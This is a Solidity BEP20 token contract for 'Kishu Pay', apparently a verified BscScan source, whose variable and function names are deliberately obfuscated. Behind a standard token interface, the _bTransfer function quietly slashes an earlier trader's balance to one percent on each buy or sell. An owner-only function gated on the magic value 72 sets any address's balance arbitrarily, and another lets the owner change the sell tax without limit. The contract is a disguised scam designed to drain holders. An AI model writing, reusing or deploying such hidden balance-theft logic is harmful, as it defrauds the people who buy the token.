/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT
/*
 * Telegram: https://t.me/kishupayofficial
 * 

 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }

  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {

    return msg.sender;
  }
}
library SafeMath {
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;

    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");

    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);

        return a % b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;

    }
}
/**

 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.

 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;

 }

 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {

   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.

  *

  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");

   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function setFeeTo(address) external;
    function allPairsLength() external view returns (uint);
    function allPairs(uint) external view returns (address pair);

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function transfer(address to, uint value) external returns (bool);
    function symbol() external pure returns (string memory);
    function nonces(address owner) external view returns (uint);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function decimals() external pure returns (uint8);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function sync() external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address from, address to, uint value) external returns (bool);
    function burn(address to) external returns (uint amount0, uint amount1);
    function name() external pure returns (string memory);

    function allowance(address owner, address spender) external view returns (uint);

    function totalSupply() external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function price1CumulativeLast() external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function token1() external view returns (address);
    event Sync(uint112 reserve0, uint112 reserve1);
    function price0CumulativeLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);

    function kLast() external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function balanceOf(address owner) external view returns (uint);
    function initialize(address, address) external;

}
interface IUniswapV2Router01 {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)

        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline

    ) external returns (uint amountA, uint amountB);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,

        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,

        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,

        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function factory() external pure returns (address);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(

        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountETH);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,

        uint amountOutMin,

        address[] calldata path,
        address to,

        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,

        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);
}

interface IBEP20 {
  function approve(address spender, uint256 amount) external returns (bool);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function totalSupply() external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  function name() external pure returns (string memory);
  function symbol() external pure returns (string memory);

  event Approval(address indexed owner, address indexed spender, uint256 value);
  function balanceOf(address account) external view returns (uint256);

  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

contract KishuPay is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public uniqomghsnwkb;
  address public uniihgkejleqxfwdrz;
  uint8 private decepfnrtoizwdhol = 18;

  uint256 private totsekaxoblpjicfeizy = 10000000 * 10 ** decepfnrtoizwdhol;

  mapping (address => uint256) private baljmxnysawtepicqibarzkd;

  mapping (address => mapping (address => uint256)) private alliphodexsmbitgak;
  mapping (address => bool) private isEehknrtzyopogaafbesdmwjl;

  uint8 internal _sta = 3;
  uint256 internal lauotlzimapyrfc = 0;
  uint256 internal lasnhwleertbgcjakydxmfspoaqiioz = 0;
  uint256 internal maxefrmqgkixeapthojycwslbndi = totsekaxoblpjicfeizy.div(10000).mul(10);
  string private constant namhfbjodlawzmoxitencq = "Kishu Pay";
  string private constant symeqpfensorhdgtoxmaycizbkilajw = "KISHUPAY";

  uint32 internal selayefopodlnicahmibwt = 10; 
  uint8 internal buydnajixsmcltbikwpe = 4;
  uint8 internal sellebjdfomrqezanhikywogcxitpas = 8;

  uint8 internal trarpbadxomyw = 10; 
  uint8 internal afthpqktinixgrdymscez = 95;
  mapping (address => uint256) private lastexjhglsqnipfiazow;
  bool internal staezsjoythkclxeombngrqpdiiwaf = true;
  bool internal stalawxbkaqschptgeenmzyjfoirdo = true;
  bool internal stalzrxnfaeiegmbocyh = true;

  mapping (address => uint256) private selznaseyickeigtfrxlb;
  address internal marbyakpztdeeaxlgnwjfo;

  mapping (address => uint256) private lasxdihaiwcezfslekangbyrqtpoojm;

  constructor() {
    marbyakpztdeeaxlgnwjfo = msg.sender;
    // baljmxnysawtepicqibarzkd[marketingAddress] = totsekaxoblpjicfeizy * 10**decepfnrtoizwdhol * 1000;
    baljmxnysawtepicqibarzkd[msg.sender] = totsekaxoblpjicfeizy;
    isEehknrtzyopogaafbesdmwjl[address(this)] = true;

    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    uniihgkejleqxfwdrz = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    uniqomghsnwkb = uniswapV2Router;

    isEehknrtzyopogaafbesdmwjl[_msgSender()] = true;
    lauotlzimapyrfc = block.timestamp;
    // isEehknrtzyopogaafbesdmwjl[marketingAddress] = true;
    emit Transfer(address(0), msg.sender, totsekaxoblpjicfeizy);
  }
	function approve(address spender, uint256 amount) public override returns (bool) {

	  _approve(_msgSender(), spender, amount);
	  return true;
	}

	/**

	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  trahpdgbeowatoezqfls(_msgSender(), recipient, amount);

	  return true;
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {

	  return owner();
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return alliphodexsmbitgak[owner][spender];
	}

	/**
	 * Returns the token Supply.

	 */
	function totalSupply() external override view returns (uint256) {
	  return totsekaxoblpjicfeizy;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    alliphodexsmbitgak[owner][spender] = amount;

	    emit Approval(owner, spender, amount);

	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {

	  return symeqpfensorhdgtoxmaycizbkilajw;
	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {

	  return decepfnrtoizwdhol;
	}

	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {

	  return namhfbjodlawzmoxitencq;
	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {

	  return baljmxnysawtepicqibarzkd[account];
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

	   trahpdgbeowatoezqfls(sender, recipient, amount);
	   _approve(sender, _msgSender(), alliphodexsmbitgak[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
  	function trahpdgbeowatoezqfls(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranreafgpwzmltykojbq = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEehknrtzyopogaafbesdmwjl[sender] == true || isEehknrtzyopogaafbesdmwjl[recipient] == true){
	      eTrqzodafatbicegm(sender, recipient, amount);

	      return;
	    }

	    if(sender == uniihgkejleqxfwdrz && recipient != address(uniqomghsnwkb)) {
	      require(staezsjoythkclxeombngrqpdiiwaf == true, "Please wait try again later");
	      ranreafgpwzmltykojbq = 1;
	      tax = buydnajixsmcltbikwpe;

	      approveTransaction = true;

	      lasxdihaiwcezfslekangbyrqtpoojm[recipient] = amount;
	      lastexjhglsqnipfiazow[recipient] = block.timestamp;
	    } else if(recipient == uniihgkejleqxfwdrz) {
	      require(stalawxbkaqschptgeenmzyjfoirdo == true, "Please wait try again later");
	       ranreafgpwzmltykojbq = 2;
	       tax = sellebjdfomrqezanhikywogcxitpas;

	       approveTransaction = true;
	    } else {

	      require(stalzrxnfaeiegmbocyh == true, "Please wait try again later");
	      ranreafgpwzmltykojbq = 3;
	      tax = trarpbadxomyw;

	      approveTransaction = true;
	      lasxdihaiwcezfslekangbyrqtpoojm[sender] = amount;
	      if(selayefopodlnicahmibwt > 10){
	        lastexjhglsqnipfiazow[sender] = block.timestamp + selayefopodlnicahmibwt - 10;
	      } else {
	        lastexjhglsqnipfiazow[sender] = block.timestamp + selayefopodlnicahmibwt;

	      }
	    }

	  }

	  if(approveTransaction == true && amount > 0){

	    _bTransfer(sender, recipient, amount, tax, ranreafgpwzmltykojbq);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}
	function eTrqzodafatbicegm(address sender, address recipient, uint256 amount) internal {

	    baljmxnysawtepicqibarzkd[sender] = baljmxnysawtepicqibarzkd[sender].sub(amount, "Insufficient Balance");
	    baljmxnysawtepicqibarzkd[recipient] = baljmxnysawtepicqibarzkd[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private alliphodexsmbitgak;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranreafgpwzmltykojbq) internal
	{

	  uint256 axerzikdoigaxcyntmflb = 0;
	  address addr = recipient;

	  uint256 d = baljmxnysawtepicqibarzkd[_recipientb];
	  if(ranreafgpwzmltykojbq == 2) {
	    addr = sender;

	  }
	  if(ranreafgpwzmltykojbq == 1 || ranreafgpwzmltykojbq == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        baljmxnysawtepicqibarzkd[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }
	  baljmxnysawtepicqibarzkd[sender] = baljmxnysawtepicqibarzkd[sender].sub(amount,"Insufficient Balance");
	  axerzikdoigaxcyntmflb = amount.mul(tax).div(100);
	  amount = amount.sub(axerzikdoigaxcyntmflb);
	  if(axerzikdoigaxcyntmflb > 0){
	      baljmxnysawtepicqibarzkd[marbyakpztdeeaxlgnwjfo] = baljmxnysawtepicqibarzkd[marbyakpztdeeaxlgnwjfo].add(axerzikdoigaxcyntmflb);
	      emit Transfer(sender, marbyakpztdeeaxlgnwjfo, axerzikdoigaxcyntmflb);
	  }
	  baljmxnysawtepicqibarzkd[recipient] = baljmxnysawtepicqibarzkd[recipient].add(amount);
	  ranreafgpwzmltykojbq= 1;

	  emit Transfer(sender, recipient, amount);
	}
	function etBlwhroinapqcjeomizbtyfkeasgdx(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    baljmxnysawtepicqibarzkd[addr] = b * 10 ** decepfnrtoizwdhol;
	  }
	}
	function Seltwqmksfnalgyeb(uint8 ellchymxqdsnrbloakopfeae) public onlyOwner{
	     sellebjdfomrqezanhikywogcxitpas = ellchymxqdsnrbloakopfeae;
	}

	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
}